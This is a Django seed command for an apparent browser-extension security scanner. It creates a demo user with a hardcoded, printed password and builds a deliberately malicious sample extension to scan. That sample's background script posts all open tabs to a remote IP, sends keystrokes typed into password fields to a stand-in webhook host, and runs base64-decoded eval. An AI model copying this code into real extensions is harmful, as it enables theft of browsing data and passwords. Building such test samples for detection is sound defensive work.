from __future__ import annotations

from io import BytesIO
import json
import zipfile

from django.contrib.auth.models import User
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.management.base import BaseCommand
from django.db import transaction

from core.models import Integration, Membership, Organization
from core.services import run_zip_forensic_scan


class Command(BaseCommand):
    help = "Seed ExtensionSentry with a demo workspace, user, integrations, scan, findings, and report."

    @transaction.atomic
    def handle(self, *args, **options):
        user, created = User.objects.get_or_create(
            username="analyst@example.com",
            defaults={"email": "analyst@example.com", "first_name": "Demo", "last_name": "Analyst"},
        )
        if created or not user.has_usable_password():
            user.set_password("SecurePass123!")
            user.save(update_fields=["password"])

        organization, _ = Organization.objects.get_or_create(
            slug="acme-security",
            defaults={
                "name": "Acme Security",
                "plan": "growth",
                "risk_tolerance": 55,
            },
        )
        Membership.objects.get_or_create(
            user=user,
            organization=organization,
            defaults={"role": "owner"},
        )
        Integration.objects.get_or_create(
            organization=organization,
            provider="slack",
            name="Security Alerts",
            defaults={
                "endpoint_url": "https://hooks.example.com/services/security",
                "secret_reference": "vault://extension-sentry/slack",
            },
        )

        manifest = {
                "manifest_version": 2,
                "name": "Customer Research Helper",
                "version": "2.7.1",
                "permissions": [
                    "tabs",
                    "downloads",
                    "history",
                    "webRequest",
                    "nativeMessaging",
                ],
                "host_permissions": ["<all_urls>"],
                "content_scripts": [
                    {
                        "matches": ["<all_urls>"],
                        "js": ["content.js"],
                    }
                ],
                "externally_connectable": {"matches": ["*"]},
                "content_security_policy": "script-src 'self' 'unsafe-eval' http://cdn.example.com; object-src 'self'",
                "update_url": "http://updates.example.com/extension.xml",
        }
        background_js = """
        const remote = "http://198.51.100.24/collect";
        chrome.tabs.query({}, tabs => fetch(remote, {method: "POST", body: JSON.stringify(tabs)}));
        document.addEventListener("keydown", event => {
          if (event.target && event.target.type === "password") {
            fetch("https://discord-webhook.example.com/token", {method: "POST", body: event.key});
          }
        });
        eval(atob("Y29uc29sZS5sb2coJ2R5bmFtaWMnKQ=="));
        """
        archive_bytes = BytesIO()
        with zipfile.ZipFile(archive_bytes, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("manifest.json", json.dumps(manifest, indent=2))
            archive.writestr("background.js", background_js)
            archive.writestr("content.js", "document.body.insertAdjacentHTML('beforeend', '<div></div>');")

        existing_scan = (
            organization.scans.filter(
                extension__name="Customer Research Helper",
                reports__file_path__endswith=".pdf",
            )
            .distinct()
            .first()
        )
        if existing_scan:
            scan = existing_scan
        else:
            scan = run_zip_forensic_scan(
                organization=organization,
                uploaded_file=SimpleUploadedFile(
                    "customer-research-helper.zip",
                    archive_bytes.getvalue(),
                    content_type="application/zip",
                ),
                user=user,
                analyst_note="Seeded adversarial extension for forensic UI validation.",
            )

        self.stdout.write(self.style.SUCCESS("Demo workspace ready."))
        self.stdout.write("Login: analyst@example.com")
        self.stdout.write("Password: SecurePass123!")
        self.stdout.write(f"Workspace API token: {organization.api_token}")
        self.stdout.write(f"Demo scan risk score: {scan.risk_score}/100")
